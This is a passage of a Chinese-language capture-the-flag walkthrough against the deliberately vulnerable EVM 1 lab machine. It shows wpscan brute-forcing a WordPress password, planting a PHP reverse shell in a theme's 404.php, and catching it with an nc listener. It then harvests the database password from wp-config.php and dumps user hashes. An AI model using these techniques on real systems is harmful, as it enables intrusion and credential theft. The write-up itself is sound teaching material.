class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop/Clash <span class="hljs-keyword">for</span> Windows-0.19.26-x64-linux]<br>└─$ wpscan --url http://192.168.56.103/wordpress -P /usr/share/wordlists/rockyou.txt -U <span class="hljs-string">&#x27;c0rrupt3d_brain&#x27;</span><br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]n<br>[+] URL: http://192.168.56.103/wordpress/ [192.168.56.103]<br>[+] Started: Tue Jun 27 04:42:18 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://192.168.56.103/wordpress/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://192.168.56.103/wordpress/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://192.168.56.103/wordpress/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://192.168.56.103/wordpress/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 5.2.4 identified (Insecure, released on 2019-10-14).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://192.168.56.103/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;<br> |  - http://192.168.56.103/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentynineteen<br> | Location: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/readme.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 2.5<br> | Style URL: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4<br> | Style Name: Twenty Nineteen<br> | Style URI: https://wordpress.org/themes/twentynineteen/<br> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.4 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: <span class="hljs-string">&#x27;Version: 1.4&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] photo-gallery<br> | Location: http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/<br> | Last Updated: 2023-06-02T15:32:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 1.8.16<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 1.5.34 (100% confidence)<br> | Found By: Query Parameter (Passive Detection)<br> |  - http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/css/jquery.mCustomScrollbar.min.css?ver=1.5.34<br> |  - http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/css/styles.min.css?ver=1.5.34<br> |  - http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/js/jquery.mCustomScrollbar.concat.min.js?ver=1.5.34<br> |  - http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/js/scripts.min.js?ver=1.5.34<br> | Confirmed By:<br> |  Readme - Stable Tag (Aggressive Detection)<br> |   - http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/readme.txt<br> |  Readme - ChangeLog Section (Aggressive Detection)<br> |   - http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/readme.txt<br><br>[+] Enumerating Config Backups (via Passive and Aggressive Methods)<br> Checking Config Backups - Time: 00:00:00 &lt;=====================================&gt; (137 / 137) 100.00% Time: 00:00:00<br><br>[i] No Config Backups Found.<br><br>[+] Performing password attack on Wp Login against 1 user/s<br>[SUCCESS] - c0rrupt3d_brain / 24992499                                                                              <br>Trying c0rrupt3d_brain / 24992499 Time: 00:02:54 &lt;                        &gt; (10700 / 14355092)  0.07%  ETA: ??:??:??<br><br>[!] Valid Combinations Found:<br> | Username: c0rrupt3d_brain, Password: 24992499<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br><br>[+] Finished: Tue Jun 27 04:45:19 2023<br>[+] Requests Done: 10874<br>[+] Cached Requests: 5<br>[+] Data Sent: 3.854 MB<br>[+] Data Received: 48.842 MB<br>[+] Memory used: 304.754 MB<br>[+] Elapsed time: 00:03:00<br><br></code></pre></td></tr></table></figure>
+
+<p>爆破得到了用户密码 <code>24992499</code>，登陆后查看主题编辑器</p>
+<p><img src="/pic/a690a0c8530ecdfd48e44638b306d530_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>其中 404.php 给了提示，可以在这里写反向 shell，我们将 php-reverse-shell.php 修改后放进去，再构造访问会 404 的 URL，提前开启监听，就可以反弹 shell</p>
+<p><img src="/pic/4d9c9b99fff041ffa31c0e161ef7f8bf_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/EVM_1]<br>└─$ sudo nc -lvnp 443<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.103] 37128<br>Linux ubuntu-extermely-vulnerable-m4ch1ine 4.4.0-87-generic <span class="hljs-comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br> 04:55:28 up 52 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.05, 0.44, 1.03<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can t access <span class="hljs-built_in">tty</span>; job control turned off<br>$ <span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ <span class="hljs-built_in">export</span> TERM=xterm-color<br><span class="hljs-built_in">export</span> TERM=xterm-color<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>反弹 shell 成功，确认目标正确，并进行简单的信息收集</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:06:73:f2 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.103/24 brd 192.168.56.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe06:73f2/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 52:54:00:c5:7d:1b brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0<br>       valid_lft forever preferred_lft forever<br>4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast master virbr0 state DOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 52:54:00:c5:7d:1b brd ff:ff:ff:ff:ff:ff<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ <span class="hljs-built_in">id</span>   <br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux ubuntu-extermely-vulnerable-m4ch1ine 4.4.0-87-generic <span class="hljs-comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ <span class="hljs-built_in">pwd</span><br><span class="hljs-built_in">pwd</span><br>/<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>sudo: 3 incorrect password attempts<br></code></pre></td></tr></table></figure>
+
+<p>接下来进入&#x2F;var&#x2F; www&#x2F;html目录看看 ，关注点主要在配置文件上，可以看看是否有数据库连接的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu-extermely-vulnerable-m4ch1ine:/var/www/html$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 11M<br>276855 drwxr-xr-x 3 www-data www-data 4.0K Nov  1  2019 .<br>276854 drwxr-xr-x 3 root     root     4.0K Oct 30  2019 ..<br>281328 -rw-r--r-- 1 www-data www-data  11K Nov  1  2019 index.html<br>282142 -rw-r--r-- 1 www-data www-data   21 Oct 30  2019 info.php<br>401054 drwxr-xr-x 5 www-data www-data 4.0K Nov  1  2019 wordpress<br>407076 -rw-r--r-- 1 www-data www-data 2.9K Oct 31  2019 wp-config.php<br> 20482 -rw-r--r-- 1 www-data www-data  11M Oct 30  2019 wp.tar.gz<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/var/www/html$ <span class="hljs-built_in">cat</span> wp-config.php<br><span class="hljs-built_in">cat</span> wp-config.php<br>&lt;?php<br>/**<br> * The base configuration <span class="hljs-keyword">for</span> WordPress<br> *<br> * The wp-config.php creation script uses this file during the<br> * installation. You don\<span class="hljs-string">&#x27;t have to use the web site, you can</span><br><span class="hljs-string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * This file contains the following configurations:</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * * MySQL settings</span><br><span class="hljs-string"> * * Secret keys</span><br><span class="hljs-string"> * * Database table prefix</span><br><span class="hljs-string"> * * ABSPATH</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @package WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-string">/** The name of the database for WordPress */</span><br><span class="hljs-string">define( &#x27;</span>DB_NAME<span class="hljs-string">&#x27;, &#x27;</span>hackme_wp<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database username */</span><br><span class="hljs-string">define( &#x27;</span>DB_USER<span class="hljs-string">&#x27;, &#x27;</span>root<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database password */</span><br><span class="hljs-string">define( &#x27;</span>DB_PASSWORD<span class="hljs-string">&#x27;, &#x27;</span>123<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL hostname */</span><br><span class="hljs-string">define( &#x27;</span>DB_HOST<span class="hljs-string">&#x27;, &#x27;</span>localhost<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Database Charset to use in creating database tables. */</span><br><span class="hljs-string">define( &#x27;</span>DB_CHARSET<span class="hljs-string">&#x27;, &#x27;</span>utf8<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** The Database Collate type. Don\&#x27;</span>t change this <span class="hljs-keyword">if</span> <span class="hljs-keyword">in</span> doubt. */<br>define( <span class="hljs-string">&#x27;DB_COLLATE&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span> );<br><br>/**<span class="hljs-comment">#@+</span><br> * Authentication Unique Keys and Salts.<br> *<br> * Change these to different unique phrases!<br> * You can generate these using the &#123;@<span class="hljs-built_in">link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;<br> * You can change these at any point <span class="hljs-keyword">in</span> time to invalidate all existing cookies. This will force all <span class="hljs-built_in">users</span> to have to <span class="hljs-built_in">log</span> <span class="hljs-keyword">in</span> again.<br> *<br> * @since 2.6.0<br> */<br>define( <span class="hljs-string">&#x27;AUTH_KEY&#x27;</span>,         <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;NONCE_KEY&#x27;</span>,        <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;AUTH_SALT&#x27;</span>,        <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;NONCE_SALT&#x27;</span>,       <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br><br>/**<span class="hljs-comment">#@-*/</span><br><br>/**<br> * WordPress Database Table prefix.<br> *<br> * You can have multiple installations <span class="hljs-keyword">in</span> one database <span class="hljs-keyword">if</span> you give each<br> * a unique prefix. Only numbers, letters, and underscores please!<br> */<br><span class="hljs-variable">$table_prefix</span> = <span class="hljs-string">&#x27;wp_&#x27;</span>;<br><br>/**<br> * For developers: WordPress debugging mode.<br> *<br> * Change this to <span class="hljs-literal">true</span> to <span class="hljs-built_in">enable</span> the display of notices during development.<br> * It is strongly recommended that plugin and theme developers use WP_DEBUG<br> * <span class="hljs-keyword">in</span> their development environments.<br> *<br> * For information on other constants that can be used <span class="hljs-keyword">for</span> debugging,<br> * visit the Codex.<br> *<br> * @<span class="hljs-built_in">link</span> https://codex.wordpress.org/Debugging_in_WordPress<br> */<br>define( <span class="hljs-string">&#x27;WP_DEBUG&#x27;</span>, <span class="hljs-literal">false</span> );<br><br>/* That\<span class="hljs-string">&#x27;s all, stop editing! Happy publishing. */</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Absolute path to the WordPress directory. */</span><br><span class="hljs-string">if ( ! defined( &#x27;</span>ABSPATH<span class="hljs-string">&#x27; ) ) &#123;</span><br><span class="hljs-string">        define( &#x27;</span>ABSPATH<span class="hljs-string">&#x27;, dirname( __FILE__ ) . &#x27;</span>/<span class="hljs-string">&#x27; );</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Sets up WordPress vars and included files. */</span><br><span class="hljs-string">require_once( ABSPATH . &#x27;</span>wp-settings.php<span class="hljs-string">&#x27; );</span><br></code></pre></td></tr></table></figure>
+
+<p>拿到了数据库的密码 123，进数据库看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu-extermely-vulnerable-m4ch1ine:/var/www/html$ mysql -uroot -p<br>mysql -uroot -p<br>Enter password: 123<br><br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection <span class="hljs-built_in">id</span> is 21345<br>Server version: 5.7.19-0ubuntu0.16.04.1 (Ubuntu)<br><br>Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>mysql&gt; show databases;<br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| sys                |<br>| vulnwp             |<br>+--------------------+<br>5 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; use vulnwp<br>use vulnwp<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br></code></pre></td></tr></table></figure>
+
+<p>看一看 wp_user 表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> * from wp_users;<br><span class="hljs-keyword">select</span> * from wp_users;<br>+----+-----------------+------------------------------------+-----------------+-------------------+----------+---------------------+---------------------+-------------+-----------------+<br>| ID | user_login      | user_pass                          | user_nicename   | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name    |<br>+----+-----------------+------------------------------------+-----------------+-------------------+----------+---------------------+---------------------+-------------+-----------------+<br>|  1 | c0rrupt3d_brain | $P<span class="hljs-variable">$BeIRcDvfjdzumCYjeRfShVUMy8BkXf</span>/ | c0rrupt3d_brain | vuln@localhost.ws |          | 2019-10-31 21:47:00 |                     |           0 | c0rrupt3d_brain |<br>+----+-----------------+------------------------------------+-----------------+-------------------+----------+---------------------+---------------------+-------------+-----------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure>
+
+<h3 id="home-目录下的隐藏文件"><a href="#home-目录下的隐藏文件" class="headerlink" title="home 目录下的隐藏文件"></a>home 目录下的隐藏文件</h3><p>就一个用户，它的密码我们已经通过爆破拿到了，进 home 目录看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ <span class="hljs-built_in">cd</span> /home<br><span class="hljs-built_in">cd</span> /home<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>root3r<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 12K<br>262146 drwxr-xr-x  3 root     root     4.0K Oct 30  2019 .<br>     2 drwxr-xr-x 23 root     root     4.0K Oct 30  2019 ..<br>286738 drwxr-xr-x  3 www-data www-data 4.0K Nov  1  2019 root3r<br></code></pre></td></tr></table></figure>
+
+<p>有个 root3r 用户，而且当前用户对此目录可控，进去看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home$ <span class="hljs-built_in">cd</span> root3r<br><span class="hljs-built_in">cd</span> root3r/<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 40K<br>286738 drwxr-xr-x 3 www-data www-data 4.0K Nov  1  2019 .<br>262146 drwxr-xr-x 3 root     root     4.0K Oct 30  2019 ..<br>282108 -rw-r--r-- 1 www-data www-data  515 Oct 30  2019 .bash_history<br>278324 -rw-r--r-- 1 www-data www-data  220 Oct 30  2019 .bash_logout<br>262821 -rw-r--r-- 1 www-data www-data 3.7K Oct 30  2019 .bashrc<br>286752 drwxr-xr-x 2 www-data www-data 4.0K Oct 30  2019 .cache<br>282130 -rw-r--r-- 1 www-data www-data   22 Oct 30  2019 .mysql_history<br>278338 -rw-r--r-- 1 www-data www-data  655 Oct 30  2019 .profile<br>282736 -rw-r--r-- 1 www-data www-data    8 Oct 31  2019 .root_password_ssh.txt<br>282182 -rw-r--r-- 1 www-data www-data    0 Oct 30  2019 .sudo_as_admin_successful<br>282524 -rw-r--r-- 1 root     root        4 Nov  1  2019 test.txt<br></code></pre></td></tr></table></figure>
+
+<p>目录下有不少好东西，先看看.root_password_ssh.txt 吧，从名字上看可能是 root 的密码</p>
